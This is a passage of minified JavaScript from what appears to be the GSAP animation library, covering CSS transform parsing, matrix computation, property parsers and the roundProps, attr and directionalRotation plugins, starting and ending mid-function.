                    Y = F,
                    j = E,
                    B = N),
                    H = Math.atan2(j, Z),
                    v.rotation = H * I,
                    H && (U = -b > H || H > b,
                    L = Math.cos(-H),
                    X = Math.sin(-H),
                    Y = Y * L + V * X,
                    E = j * L + Z * X,
                    Z = j * -X + Z * L,
                    $ = B * -X + $ * L,
                    j = E),
                    U && K ? v.rotation = v.rotationX = 0 : U && z ? v.rotation = v.rotationY = 0 : z && K && (v.rotationY = v.rotationX = 0),
                    v.scaleX = (0 | Math.sqrt(Y * Y + j * j) * w + .5) / w,
                    v.scaleY = (0 | Math.sqrt(Z * Z + k * k) * w + .5) / w,
                    v.scaleZ = (0 | Math.sqrt($ * $ + R * R) * w + .5) / w,
                    v.skewX = 0,
                    v.perspective = W ? 1 / (0 > W ? -W : W) : 0,
                    v.x = A,
                    v.y = O,
                    v.z = D
                }
            } else if (!(xe && !s && n.length && v.x === n[4] && v.y === n[5] && (v.rotationX || v.rotationY) || void 0 !== v.x && "none" === G(t, "display", e))) {
                var J = n.length >= 6
                  , te = J ? n[0] : 1
                  , ee = n[1] || 0
                  , ie = n[2] || 0
                  , se = J ? n[3] : 1;
                v.x = n[4] || 0,
                v.y = n[5] || 0,
                _ = Math.sqrt(te * te + ee * ee),
                u = Math.sqrt(se * se + ie * ie),
                p = te || ee ? Math.atan2(ee, te) * I : v.rotation || 0,
                f = ie || se ? Math.atan2(ie, se) * I + p : v.skewX || 0,
                c = _ - Math.abs(v.scaleX || 0),
                m = u - Math.abs(v.scaleY || 0),
                Math.abs(f) > 90 && 270 > Math.abs(f) && (y ? (_ *= -1,
                f += 0 >= p ? 180 : -180,
                p += 0 >= p ? 180 : -180) : (u *= -1,
                f += 0 >= f ? 180 : -180)),
                d = (p - v.rotation) % 180,
                g = (f - v.skewX) % 180,
                (void 0 === v.skewX || c > T || -T > c || m > T || -T > m || d > -x && x > d && false | d * w || g > -x && x > g && false | g * w) && (v.scaleX = _,
                v.scaleY = u,
                v.rotation = p,
                v.skewX = f),
                xe && (v.rotationX = v.rotationY = v.z = 0,
                v.perspective = parseFloat(a.defaultTransformPerspective) || 0,
                v.scaleZ = 1)
            }
            v.zOrigin = P;
            for (o in v)
                T > v[o] && v[o] > -T && (v[o] = 0);
            return i && (t._gsTransform = v),
            v
        }
          , Pe = function(t) {
            var e, i, s = this.data, r = -s.rotation * M, n = r + s.skewX * M, a = 1e5, o = (0 | Math.cos(r) * s.scaleX * a) / a, h = (0 | Math.sin(r) * s.scaleX * a) / a, l = (0 | Math.sin(n) * -s.scaleY * a) / a, _ = (0 | Math.cos(n) * s.scaleY * a) / a, u = this.t.style, p = this.t.currentStyle;
            if (p) {
                i = h,
                h = -l,
                l = -i,
                e = p.filter,
                u.filter = "";
                var f, m, d = this.t.offsetWidth, g = this.t.offsetHeight, v = "absolute" !== p.position, w = "progid:DXImageTransform.Microsoft.Matrix(M11=" + o + ", M12=" + h + ", M21=" + l + ", M22=" + _, x = s.x, b = s.y;
                if (null != s.ox && (f = (s.oxp ? .01 * d * s.ox : s.ox) - d / 2,
                m = (s.oyp ? .01 * g * s.oy : s.oy) - g / 2,
                x += f - (f * o + m * h),
                b += m - (f * l + m * _)),
                v ? (f = d / 2,
                m = g / 2,
                w += ", Dx=" + (f - (f * o + m * h) + x) + ", Dy=" + (m - (f * l + m * _) + b) + ")") : w += ", sizingMethod='auto expand')",
                u.filter = -1 !== e.indexOf("DXImageTransform.Microsoft.Matrix(") ? e.replace(O, w) : w + " " + e,
                (0 === t || 1 === t) && 1 === o && 0 === h && 0 === l && 1 === _ && (v && -1 === w.indexOf("Dx=0, Dy=0") || T.test(e) && 100 !== parseFloat(RegExp.$1) || -1 === e.indexOf("gradient(" && e.indexOf("Alpha")) && u.removeAttribute("filter")),
                !v) {
                    var P, S, k, R = 8 > c ? 1 : -1;
                    for (f = s.ieOffsetX || 0,
                    m = s.ieOffsetY || 0,
                    s.ieOffsetX = Math.round((d - ((0 > o ? -o : o) * d + (0 > h ? -h : h) * g)) / 2 + x),
                    s.ieOffsetY = Math.round((g - ((0 > _ ? -_ : _) * g + (0 > l ? -l : l) * d)) / 2 + b),
                    ce = 0; 4 > ce; ce++)
                        S = J[ce],
                        P = p[S],
                        i = -1 !== P.indexOf("px") ? parseFloat(P) : $(this.t, S, parseFloat(P), P.replace(y, "")) || 0,
                        k = i !== s[S] ? 2 > ce ? -s.ieOffsetX : -s.ieOffsetY : 2 > ce ? f - s.ieOffsetX : m - s.ieOffsetY,
                        u[S] = (s[S] = Math.round(i - k * (0 === ce || 2 === ce ? 1 : R))) + "px"
                }
            }
        }
          , Se = function() {
            var t, e, i, s, r, n, a, o, h, l, _, u, f, c, m, d, g, v, y, T, w, x, b, P, S, k, R = this.data, A = this.t.style, C = R.rotation * M, O = R.scaleX, D = R.scaleY, I = R.scaleZ, F = R.perspective;
            if (p && (P = A.top ? "top" : A.bottom ? "bottom" : parseFloat(G(this.t, "top", null, !1)) ? "bottom" : "top",
            T = G(this.t, P, null, !1),
            S = parseFloat(T) || 0,
            k = T.substr((S + "").length) || "px",
            R._ffFix = !R._ffFix,
            A[P] = (R._ffFix ? S + .05 : S - .05) + k),
            C || R.skewX)
                v = Math.cos(C),
                y = Math.sin(C),
                t = v,
                r = y,
                R.skewX && (C -= R.skewX * M,
                v = Math.cos(C),
                y = Math.sin(C)),
                e = -y,
                n = v;
            else {
                if (!(R.rotationY || R.rotationX || 1 !== I || F))
                    return A[ye] = "translate3d(" + R.x + "px," + R.y + "px," + R.z + "px)" + (1 !== O || 1 !== D ? " scale(" + O + "," + D + ")" : ""),
                    void 0;
                t = n = 1,
                e = r = 0
            }
            _ = 1,
            i = s = a = o = h = l = u = f = c = 0,
            m = F ? -1 / F : 0,
            d = R.zOrigin,
            g = 1e5,
            C = R.rotationY * M,
            C && (v = Math.cos(C),
            y = Math.sin(C),
            h = _ * -y,
            f = m * -y,
            i = t * y,
            a = r * y,
            _ *= v,
            m *= v,
            t *= v,
            r *= v),
            C = R.rotationX * M,
            C && (v = Math.cos(C),
            y = Math.sin(C),
            T = e * v + i * y,
            w = n * v + a * y,
            x = l * v + _ * y,
            b = c * v + m * y,
            i = e * -y + i * v,
            a = n * -y + a * v,
            _ = l * -y + _ * v,
            m = c * -y + m * v,
            e = T,
            n = w,
            l = x,
            c = b),
            1 !== I && (i *= I,
            a *= I,
            _ *= I,
            m *= I),
            1 !== D && (e *= D,
            n *= D,
            l *= D,
            c *= D),
            1 !== O && (t *= O,
            r *= O,
            h *= O,
            f *= O),
            d && (u -= d,
            s = i * u,
            o = a * u,
            u = _ * u + d),
            s = (T = (s += R.x) - (s |= 0)) ? (0 | T * g + (0 > T ? -.5 : .5)) / g + s : s,
            o = (T = (o += R.y) - (o |= 0)) ? (0 | T * g + (0 > T ? -.5 : .5)) / g + o : o,
            u = (T = (u += R.z) - (u |= 0)) ? (0 | T * g + (0 > T ? -.5 : .5)) / g + u : u,
            A[ye] = "matrix3d(" + [(0 | t * g) / g, (0 | r * g) / g, (0 | h * g) / g, (0 | f * g) / g, (0 | e * g) / g, (0 | n * g) / g, (0 | l * g) / g, (0 | c * g) / g, (0 | i * g) / g, (0 | a * g) / g, (0 | _ * g) / g, (0 | m * g) / g, s, o, u, F ? 1 + -u / F : 1].join(",") + ")"
        }
          , ke = function() {
            var t, e, i, s, r, n, a, o, h, l = this.data, _ = this.t, u = _.style;
            p && (t = u.top ? "top" : u.bottom ? "bottom" : parseFloat(G(_, "top", null, !1)) ? "bottom" : "top",
            e = G(_, t, null, !1),
            i = parseFloat(e) || 0,
            s = e.substr((i + "").length) || "px",
            l._ffFix = !l._ffFix,
            u[t] = (l._ffFix ? i + .05 : i - .05) + s),
            l.rotation || l.skewX ? (r = l.rotation * M,
            n = r - l.skewX * M,
            a = 1e5,
            o = l.scaleX * a,
            h = l.scaleY * a,
            u[ye] = "matrix(" + (0 | Math.cos(r) * o) / a + "," + (0 | Math.sin(r) * o) / a + "," + (0 | Math.sin(n) * -h) / a + "," + (0 | Math.cos(n) * h) / a + "," + l.x + "," + l.y + ")") : u[ye] = "matrix(" + l.scaleX + ",0,0," + l.scaleY + "," + l.x + "," + l.y + ")"
        };
        de("transform,scale,scaleX,scaleY,scaleZ,x,y,z,rotation,rotationX,rotationY,rotationZ,skewX,skewY,shortRotation,shortRotationX,shortRotationY,shortRotationZ,transformOrigin,transformPerspective,directionalRotation,parseTransform,force3D", {
            parser: function(t, e, i, s, n, a, o) {
                if (s._transform)
                    return n;
                var h, l, _, u, p, f, c, m = s._transform = be(t, r, !0, o.parseTransform), d = t.style, g = 1e-6, v = ve.length, y = o, T = {};
                if ("string" == typeof y.transform && ye)
                    _ = d.cssText,
                    d[ye] = y.transform,
                    d.display = "block",
                    h = be(t, null, !1),
                    d.cssText = _;
                else if ("object" == typeof y) {
                    if (h = {
                        scaleX: se(null != y.scaleX ? y.scaleX : y.scale, m.scaleX),
                        scaleY: se(null != y.scaleY ? y.scaleY : y.scale, m.scaleY),
                        scaleZ: se(null != y.scaleZ ? y.scaleZ : y.scale, m.scaleZ),
                        x: se(y.x, m.x),
                        y: se(y.y, m.y),
                        z: se(y.z, m.z),
                        perspective: se(y.transformPerspective, m.perspective)
                    },
                    c = y.directionalRotation,
                    null != c)
                        if ("object" == typeof c)
                            for (_ in c)
                                y[_] = c[_];
                        else
                            y.rotation = c;
                    h.rotation = re("rotation"in y ? y.rotation : "shortRotation"in y ? y.shortRotation + "_short" : "rotationZ"in y ? y.rotationZ : m.rotation, m.rotation, "rotation", T),
                    xe && (h.rotationX = re("rotationX"in y ? y.rotationX : "shortRotationX"in y ? y.shortRotationX + "_short" : m.rotationX || 0, m.rotationX, "rotationX", T),
                    h.rotationY = re("rotationY"in y ? y.rotationY : "shortRotationY"in y ? y.shortRotationY + "_short" : m.rotationY || 0, m.rotationY, "rotationY", T)),
                    h.skewX = null == y.skewX ? m.skewX : re(y.skewX, m.skewX),
                    h.skewY = null == y.skewY ? m.skewY : re(y.skewY, m.skewY),
                    (l = h.skewY - m.skewY) && (h.skewX += l,
                    h.rotation += l)
                }
                for (null != y.force3D && (m.force3D = y.force3D,
                f = !0),
                p = m.force3D || m.z || m.rotationX || m.rotationY || h.z || h.rotationX || h.rotationY || h.perspective,
                p || null == y.scale || (h.scaleZ = 1); --v > -1; )
                    i = ve[v],
                    u = h[i] - m[i],
                    (u > g || -g > u || null != F[i]) && (f = !0,
                    n = new pe(m,i,m[i],u,n),
                    i in T && (n.e = T[i]),
                    n.xs0 = 0,
                    n.plugin = a,
                    s._overwriteProps.push(n.n));
                return u = y.transformOrigin,
                (u || xe && p && m.zOrigin) && (ye ? (f = !0,
                i = we,
                u = (u || G(t, i, r, !1, "50% 50%")) + "",
                n = new pe(d,i,0,0,n,-1,"transformOrigin"),
                n.b = d[i],
                n.plugin = a,
                xe ? (_ = m.zOrigin,
                u = u.split(" "),
                m.zOrigin = (u.length > 2 && (0 === _ || "0px" !== u[2]) ? parseFloat(u[2]) : _) || 0,
                n.xs0 = n.e = d[i] = u[0] + " " + (u[1] || "50%") + " 0px",
                n = new pe(m,"zOrigin",0,0,n,-1,n.n),
                n.b = _,
                n.xs0 = n.e = m.zOrigin) : n.xs0 = n.e = d[i] = u) : ee(u + "", m)),
                f && (s._transformType = p || 3 === this._transformType ? 3 : 2),
                n
            },
            prefix: !0
        }),
        de("boxShadow", {
            defaultValue: "0px 0px 0px 0px #999",
            prefix: !0,
            color: !0,
            multi: !0,
            keyword: "inset"
        }),
        de("borderRadius", {
            defaultValue: "0px",
            parser: function(t, e, i, n, a) {
                e = this.format(e);
                var o, h, l, _, u, p, f, c, m, d, g, v, y, T, w, x, b = ["borderTopLeftRadius", "borderTopRightRadius", "borderBottomRightRadius", "borderBottomLeftRadius"], P = t.style;
                for (m = parseFloat(t.offsetWidth),
                d = parseFloat(t.offsetHeight),
                o = e.split(" "),
                h = 0; b.length > h; h++)
                    this.p.indexOf("border") && (b[h] = V(b[h])),
                    u = _ = G(t, b[h], r, !1, "0px"),
                    -1 !== u.indexOf(" ") && (_ = u.split(" "),
                    u = _[0],
                    _ = _[1]),
                    p = l = o[h],
                    f = parseFloat(u),
                    v = u.substr((f + "").length),
                    y = "=" === p.charAt(1),
                    y ? (c = parseInt(p.charAt(0) + "1", 10),
                    p = p.substr(2),
                    c *= parseFloat(p),
                    g = p.substr((c + "").length - (0 > c ? 1 : 0)) || "") : (c = parseFloat(p),
                    g = p.substr((c + "").length)),
                    "" === g && (g = s[i] || v),
                    g !== v && (T = $(t, "borderLeft", f, v),
                    w = $(t, "borderTop", f, v),
                    "%" === g ? (u = 100 * (T / m) + "%",
                    _ = 100 * (w / d) + "%") : "em" === g ? (x = $(t, "borderLeft", 1, "em"),
                    u = T / x + "em",
                    _ = w / x + "em") : (u = T + "px",
                    _ = w + "px"),
                    y && (p = parseFloat(u) + c + g,
                    l = parseFloat(_) + c + g)),
                    a = fe(P, b[h], u + " " + _, p + " " + l, !1, "0px", a);
                return a
            },
            prefix: !0,
            formatter: le("0px 0px 0px 0px", !1, !0)
        }),
        de("backgroundPosition", {
            defaultValue: "0 0",
            parser: function(t, e, i, s, n, a) {
                var o, h, l, _, u, p, f = "background-position", m = r || Z(t, null), d = this.format((m ? c ? m.getPropertyValue(f + "-x") + " " + m.getPropertyValue(f + "-y") : m.getPropertyValue(f) : t.currentStyle.backgroundPositionX + " " + t.currentStyle.backgroundPositionY) || "0 0"), g = this.format(e);
                if (-1 !== d.indexOf("%") != (-1 !== g.indexOf("%")) && (p = G(t, "backgroundImage").replace(k, ""),
                p && "none" !== p)) {
                    for (o = d.split(" "),
                    h = g.split(" "),
                    L.setAttribute("src", p),
                    l = 2; --l > -1; )
                        d = o[l],
                        _ = -1 !== d.indexOf("%"),
                        _ !== (-1 !== h[l].indexOf("%")) && (u = 0 === l ? t.offsetWidth - L.width : t.offsetHeight - L.height,
                        o[l] = _ ? parseFloat(d) / 100 * u + "px" : 100 * (parseFloat(d) / u) + "%");
                    d = o.join(" ")
                }
                return this.parseComplex(t.style, d, g, n, a)
            },
            formatter: ee
        }),
        de("backgroundSize", {
            defaultValue: "0 0",
            formatter: ee
        }),
        de("perspective", {
            defaultValue: "0px",
            prefix: !0
        }),
        de("perspectiveOrigin", {
            defaultValue: "50% 50%",
            prefix: !0
        }),
        de("transformStyle", {
            prefix: !0
        }),
        de("backfaceVisibility", {
            prefix: !0
        }),
        de("userSelect", {
            prefix: !0
        }),
        de("margin", {
            parser: _e("marginTop,marginRight,marginBottom,marginLeft")
        }),
        de("padding", {
            parser: _e("paddingTop,paddingRight,paddingBottom,paddingLeft")
        }),
        de("clip", {
            defaultValue: "rect(0px,0px,0px,0px)",
            parser: function(t, e, i, s, n, a) {
                var o, h, l;
                return 9 > c ? (h = t.currentStyle,
                l = 8 > c ? " " : ",",
                o = "rect(" + h.clipTop + l + h.clipRight + l + h.clipBottom + l + h.clipLeft + ")",
                e = this.format(e).split(",").join(l)) : (o = this.format(G(t, this.p, r, !1, this.dflt)),
                e = this.format(e)),
                this.parseComplex(t.style, o, e, n, a)
            }
        }),
        de("textShadow", {
            defaultValue: "0px 0px 0px #999",
            color: !0,
            multi: !0
        }),
        de("autoRound,strictUnits", {
            parser: function(t, e, i, s, r) {
                return r
            }
        }),
        de("border", {
            defaultValue: "0px solid #000",
            parser: function(t, e, i, s, n, a) {
                return this.parseComplex(t.style, this.format(G(t, "borderTopWidth", r, !1, "0px") + " " + G(t, "borderTopStyle", r, !1, "solid") + " " + G(t, "borderTopColor", r, !1, "#000")), this.format(e), n, a)
            },
            color: !0,
            formatter: function(t) {
                var e = t.split(" ");
                return e[0] + " " + (e[1] || "solid") + " " + (t.match(he) || ["#000"])[0]
            }
        }),
        de("float,cssFloat,styleFloat", {
            parser: function(t, e, i, s, r) {
                var n = t.style
                  , a = "cssFloat"in n ? "cssFloat" : "styleFloat";
                return new pe(n,a,0,0,r,-1,i,!1,0,n[a],e)
            }
        });
        var Re = function(t) {
            var e, i = this.t, s = i.filter || G(this.data, "filter"), r = 0 | this.s + this.c * t;
            100 === r && (-1 === s.indexOf("atrix(") && -1 === s.indexOf("radient(") && -1 === s.indexOf("oader(") ? (i.removeAttribute("filter"),
            e = !G(this.data, "filter")) : (i.filter = s.replace(x, ""),
            e = !0)),
            e || (this.xn1 && (i.filter = s = s || "alpha(opacity=" + r + ")"),
            -1 === s.indexOf("opacity") ? 0 === r && this.xn1 || (i.filter = s + " alpha(opacity=" + r + ")") : i.filter = s.replace(T, "opacity=" + r))
        };
        de("opacity,alpha,autoAlpha", {
            defaultValue: "1",
            parser: function(t, e, i, s, n, a) {
                var o = parseFloat(G(t, "opacity", r, !1, "1"))
                  , h = t.style
                  , l = "autoAlpha" === i;
                return "string" == typeof e && "=" === e.charAt(1) && (e = ("-" === e.charAt(0) ? -1 : 1) * parseFloat(e.substr(2)) + o),
                l && 1 === o && "hidden" === G(t, "visibility", r) && 0 !== e && (o = 0),
                U ? n = new pe(h,"opacity",o,e - o,n) : (n = new pe(h,"opacity",100 * o,100 * (e - o),n),
                n.xn1 = l ? 1 : 0,
                h.zoom = 1,
                n.type = 2,
                n.b = "alpha(opacity=" + n.s + ")",
                n.e = "alpha(opacity=" + (n.s + n.c) + ")",
                n.data = t,
                n.plugin = a,
                n.setRatio = Re),
                l && (n = new pe(h,"visibility",0,0,n,-1,null,!1,0,0 !== o ? "inherit" : "hidden",0 === e ? "hidden" : "inherit"),
                n.xs0 = "inherit",
                s._overwriteProps.push(n.n),
                s._overwriteProps.push(i)),
                n
            }
        });
        var Ae = function(t, e) {
            e && (t.removeProperty ? t.removeProperty(e.replace(P, "-$1").toLowerCase()) : t.removeAttribute(e))
        }
          , Ce = function(t) {
            if (this.t._gsClassPT = this,
            1 === t || 0 === t) {
                this.t.className = 0 === t ? this.b : this.e;
                for (var e = this.data, i = this.t.style; e; )
                    e.v ? i[e.p] = e.v : Ae(i, e.p),
                    e = e._next;
                1 === t && this.t._gsClassPT === this && (this.t._gsClassPT = null)
            } else
                this.t.className !== this.e && (this.t.className = this.e)
        };
        de("className", {
            parser: function(t, e, s, n, a, o, h) {
                var l, _, u, p, f, c = t.className, m = t.style.cssText;
                if (a = n._classNamePT = new pe(t,s,0,0,a,2),
                a.setRatio = Ce,
                a.pr = -11,
                i = !0,
                a.b = c,
                _ = W(t, r),
                u = t._gsClassPT) {
                    for (p = {},
                    f = u.data; f; )
                        p[f.p] = 1,
                        f = f._next;
                    u.setRatio(1)
                }
                return t._gsClassPT = a,
                a.e = "=" !== e.charAt(1) ? e : c.replace(RegExp("\\s*\\b" + e.substr(2) + "\\b"), "") + ("+" === e.charAt(0) ? " " + e.substr(2) : ""),
                n._tween._duration && (t.className = a.e,
                l = H(t, _, W(t), h, p),
                t.className = c,
                a.data = l.firstMPT,
                t.style.cssText = m,
                a = a.xfirst = n.parse(t, l.difs, a, o)),
                a
            }
        });
        var Oe = function(t) {
            if ((1 === t || 0 === t) && this.data._totalTime === this.data._totalDuration && "isFromStart" !== this.data.data) {
                var e, i, s, r, n = this.t.style, a = o.transform.parse;
                if ("all" === this.e)
                    n.cssText = "",
                    r = !0;
                else
                    for (e = this.e.split(","),
                    s = e.length; --s > -1; )
                        i = e[s],
                        o[i] && (o[i].parse === a ? r = !0 : i = "transformOrigin" === i ? we : o[i].p),
                        Ae(n, i);
                r && (Ae(n, ye),
                this.t._gsTransform && delete this.t._gsTransform)
            }
        };
        for (de("clearProps", {
            parser: function(t, e, s, r, n) {
                return n = new pe(t,s,0,0,n,2),
                n.setRatio = Oe,
                n.e = e,
                n.pr = -10,
                n.data = r._tween,
                i = !0,
                n
            }
        }),
        h = "bezier,throwProps,physicsProps,physics2D".split(","),
        ce = h.length; ce--; )
            ge(h[ce]);
        h = a.prototype,
        h._firstPT = null,
        h._onInitTween = function(t, e, o) {
            if (!t.nodeType)
                return !1;
            this._target = t,
            this._tween = o,
            this._vars = e,
            l = e.autoRound,
            i = !1,
            s = e.suffixMap || a.suffixMap,
            r = Z(t, ""),
            n = this._overwriteProps;
            var h, p, c, m, d, g, v, y, T, x = t.style;
            if (_ && "" === x.zIndex && (h = G(t, "zIndex", r),
            ("auto" === h || "" === h) && (x.zIndex = 0)),
            "string" == typeof e && (m = x.cssText,
            h = W(t, r),
            x.cssText = m + ";" + e,
            h = H(t, h, W(t)).difs,
            !U && w.test(e) && (h.opacity = parseFloat(RegExp.$1)),
            e = h,
            x.cssText = m),
            this._firstPT = p = this.parse(t, e, null),
            this._transformType) {
                for (T = 3 === this._transformType,
                ye ? u && (_ = !0,
                "" === x.zIndex && (v = G(t, "zIndex", r),
                ("auto" === v || "" === v) && (x.zIndex = 0)),
                f && (x.WebkitBackfaceVisibility = this._vars.WebkitBackfaceVisibility || (T ? "visible" : "hidden"))) : x.zoom = 1,
                c = p; c && c._next; )
                    c = c._next;
                y = new pe(t,"transform",0,0,null,2),
                this._linkCSSP(y, null, c),
                y.setRatio = T && xe ? Se : ye ? ke : Pe,
                y.data = this._transform || be(t, r, !0),
                n.pop()
            }
            if (i) {
                for (; p; ) {
                    for (g = p._next,
                    c = m; c && c.pr > p.pr; )
                        c = c._next;
                    (p._prev = c ? c._prev : d) ? p._prev._next = p : m = p,
                    (p._next = c) ? c._prev = p : d = p,
                    p = g
                }
                this._firstPT = m
            }
            return !0
        }
        ,
        h.parse = function(t, e, i, n) {
            var a, h, _, u, p, f, c, m, d, g, v = t.style;
            for (a in e)
                f = e[a],
                h = o[a],
                h ? i = h.parse(t, f, a, this, i, n, e) : (p = G(t, a, r) + "",
                d = "string" == typeof f,
                "color" === a || "fill" === a || "stroke" === a || -1 !== a.indexOf("Color") || d && b.test(f) ? (d || (f = oe(f),
                f = (f.length > 3 ? "rgba(" : "rgb(") + f.join(",") + ")"),
                i = fe(v, a, p, f, !0, "transparent", i, 0, n)) : !d || -1 === f.indexOf(" ") && -1 === f.indexOf(",") ? (_ = parseFloat(p),
                c = _ || 0 === _ ? p.substr((_ + "").length) : "",
                ("" === p || "auto" === p) && ("width" === a || "height" === a ? (_ = te(t, a, r),
                c = "px") : "left" === a || "top" === a ? (_ = Q(t, a, r),
                c = "px") : (_ = "opacity" !== a ? 0 : 1,
                c = "")),
                g = d && "=" === f.charAt(1),
                g ? (u = parseInt(f.charAt(0) + "1", 10),
                f = f.substr(2),
                u *= parseFloat(f),
                m = f.replace(y, "")) : (u = parseFloat(f),
                m = d ? f.substr((u + "").length) || "" : ""),
                "" === m && (m = s[a] || c),
                f = u || 0 === u ? (g ? u + _ : u) + m : e[a],
                c !== m && "" !== m && (u || 0 === u) && (_ || 0 === _) && (_ = $(t, a, _, c),
                "%" === m ? (_ /= $(t, a, 100, "%") / 100,
                _ > 100 && (_ = 100),
                e.strictUnits !== !0 && (p = _ + "%")) : "em" === m ? _ /= $(t, a, 1, "em") : (u = $(t, a, u, m),
                m = "px"),
                g && (u || 0 === u) && (f = u + _ + m)),
                g && (u += _),
                !_ && 0 !== _ || !u && 0 !== u ? void 0 !== v[a] && (f || "NaN" != f + "" && null != f) ? (i = new pe(v,a,u || _ || 0,0,i,-1,a,!1,0,p,f),
                i.xs0 = "none" !== f || "display" !== a && -1 === a.indexOf("Style") ? f : p) : j("invalid " + a + " tween value: " + e[a]) : (i = new pe(v,a,_,u - _,i,0,a,l !== !1 && ("px" === m || "zIndex" === a),0,p,f),
                i.xs0 = m)) : i = fe(v, a, p, f, !0, null, i, 0, n)),
                n && i && !i.plugin && (i.plugin = n);
            return i
        }
        ,
        h.setRatio = function(t) {
            var e, i, s, r = this._firstPT, n = 1e-6;
            if (1 !== t || this._tween._time !== this._tween._duration && 0 !== this._tween._time)
                if (t || this._tween._time !== this._tween._duration && 0 !== this._tween._time || this._tween._rawPrevTime === -1e-6)
                    for (; r; ) {
                        if (e = r.c * t + r.s,
                        r.r ? e = e > 0 ? 0 | e + .5 : 0 | e - .5 : n > e && e > -n && (e = 0),
                        r.type)
                            if (1 === r.type)
                                if (s = r.l,
                                2 === s)
                                    r.t[r.p] = r.xs0 + e + r.xs1 + r.xn1 + r.xs2;
                                else if (3 === s)
                                    r.t[r.p] = r.xs0 + e + r.xs1 + r.xn1 + r.xs2 + r.xn2 + r.xs3;
                                else if (4 === s)
                                    r.t[r.p] = r.xs0 + e + r.xs1 + r.xn1 + r.xs2 + r.xn2 + r.xs3 + r.xn3 + r.xs4;
                                else if (5 === s)
                                    r.t[r.p] = r.xs0 + e + r.xs1 + r.xn1 + r.xs2 + r.xn2 + r.xs3 + r.xn3 + r.xs4 + r.xn4 + r.xs5;
                                else {
                                    for (i = r.xs0 + e + r.xs1,
                                    s = 1; r.l > s; s++)
                                        i += r["xn" + s] + r["xs" + (s + 1)];
                                    r.t[r.p] = i
                                }
                            else
                                -1 === r.type ? r.t[r.p] = r.xs0 : r.setRatio && r.setRatio(t);
                        else
                            r.t[r.p] = e + r.xs0;
                        r = r._next
                    }
                else
                    for (; r; )
                        2 !== r.type ? r.t[r.p] = r.b : r.setRatio(t),
                        r = r._next;
            else
                for (; r; )
                    2 !== r.type ? r.t[r.p] = r.e : r.setRatio(t),
                    r = r._next
        }
        ,
        h._enableTransforms = function(t) {
            this._transformType = t || 3 === this._transformType ? 3 : 2,
            this._transform = this._transform || be(this._target, r, !0)
        }
        ,
        h._linkCSSP = function(t, e, i, s) {
            return t && (e && (e._prev = t),
            t._next && (t._next._prev = t._prev),
            t._prev ? t._prev._next = t._next : this._firstPT === t && (this._firstPT = t._next,
            s = !0),
            i ? i._next = t : s || null !== this._firstPT || (this._firstPT = t),
            t._next = e,
            t._prev = i),
            t
        }
        ,
        h._kill = function(e) {
            var i, s, r, n = e;
            if (e.autoAlpha || e.alpha) {
                n = {};
                for (s in e)
                    n[s] = e[s];
                n.opacity = 1,
                n.autoAlpha && (n.visibility = 1)
            }
            return e.className && (i = this._classNamePT) && (r = i.xfirst,
            r && r._prev ? this._linkCSSP(r._prev, i._next, r._prev._prev) : r === this._firstPT && (this._firstPT = i._next),
            i._next && this._linkCSSP(i._next, i._next._next, r._prev),
            this._classNamePT = null),
            t.prototype._kill.call(this, n)
        }
        ;
        var De = function(t, e, i) {
            var s, r, n, a;
            if (t.slice)
                for (r = t.length; --r > -1; )
                    De(t[r], e, i);
            else
                for (s = t.childNodes,
                r = s.length; --r > -1; )
                    n = s[r],
                    a = n.type,
                    n.style && (e.push(W(n)),
                    i && i.push(n)),
                    1 !== a && 9 !== a && 11 !== a || !n.childNodes.length || De(n, e, i)
        };
        return a.cascadeTo = function(t, i, s) {
            var r, n, a, o = e.to(t, i, s), h = [o], l = [], _ = [], u = [], p = e._internals.reservedProps;
            for (t = o._targets || o.target,
            De(t, l, u),
            o.render(i, !0),
            De(t, _),
            o.render(0, !0),
            o._enabled(!0),
            r = u.length; --r > -1; )
                if (n = H(u[r], l[r], _[r]),
                n.firstMPT) {
                    n = n.difs;
                    for (a in s)
                        p[a] && (n[a] = s[a]);
                    h.push(e.to(u[r], i, n))
                }
            return h
        }
        ,
        t.activate([a]),
        a
    }, !0),
    function() {
        var t = window._gsDefine.plugin({
            propName: "roundProps",
            priority: -1,
            API: 2,
            init: function(t, e, i) {
                return this._tween = i,
                !0
            }
        })
          , e = t.prototype;
        e._onInitAllProps = function() {
            for (var t, e, i, s = this._tween, r = s.vars.roundProps instanceof Array ? s.vars.roundProps : s.vars.roundProps.split(","), n = r.length, a = {}, o = s._propLookup.roundProps; --n > -1; )
                a[r[n]] = 1;
            for (n = r.length; --n > -1; )
                for (t = r[n],
                e = s._firstPT; e; )
                    i = e._next,
                    e.pg ? e.t._roundProps(a, !0) : e.n === t && (this._add(e.t, t, e.s, e.c),
                    i && (i._prev = e._prev),
                    e._prev ? e._prev._next = i : s._firstPT === e && (s._firstPT = i),
                    e._next = e._prev = null,
                    s._propLookup[t] = o),
                    e = i;
            return !1
        }
        ,
        e._add = function(t, e, i, s) {
            this._addTween(t, e, i, i + s, e, !0),
            this._overwriteProps.push(e)
        }
    }(),
    window._gsDefine.plugin({
        propName: "attr",
        API: 2,
        init: function(t, e) {
            var i;
            if ("function" != typeof t.setAttribute)
                return !1;
            this._target = t,
            this._proxy = {};
            for (i in e)
                this._addTween(this._proxy, i, parseFloat(t.getAttribute(i)), e[i], i) && this._overwriteProps.push(i);
            return !0
        },
        set: function(t) {
            this._super.setRatio.call(this, t);
            for (var e, i = this._overwriteProps, s = i.length; --s > -1; )
                e = i[s],
                this._target.setAttribute(e, this._proxy[e] + "")
        }
    }),
    window._gsDefine.plugin({
        propName: "directionalRotation",
        API: 2,
        init: function(t, e) {
            "object" != typeof e && (e = {
                rotation: e
            }),
            this.finals = {};
            var i, s, r, n, a, o, h = e.useRadians === !0 ? 2 * Math.PI : 360, l = 1e-6;
            for (i in e)
                "useRadians" !== i && (o = (e[i] + "").split("_"),
                s = o[0],
                r = parseFloat("function" != typeof t[i] ? t[i] : t[i.indexOf("set") || "function" != typeof t["get" + i.substr(3)] ? i : "get" + i.substr(3)]()),
                n = this.finals[i] = "string" == typeof s && "=" === s.charAt(1) ? r + parseInt(s.charAt(0) + "1", 10) * Number(s.substr(2)) : Number(s) || 0,
                a = n - r,
                o.length && (s = o.join("_"),
                -1 !== s.indexOf("short") && (a %= h,
                a !== a % (h / 2) && (a = 0 > a ? a + h : a - h)),
                -1 !== s.indexOf("_cw") && 0 > a ? a = (a + 9999999999 * h) % h - (0 | a / h) * h : -1 !== s.indexOf("ccw") && a > 0 && (a = (a - 9999999999 * h) % h - (0 | a / h) * h)),
                (a > l || -l > a) && (this._addTween(t, i, r, r + a, i),
                this._overwriteProps.push(i)));
            return !0
        },
        set: function(t) {
            var e;
            if (1 !== t)
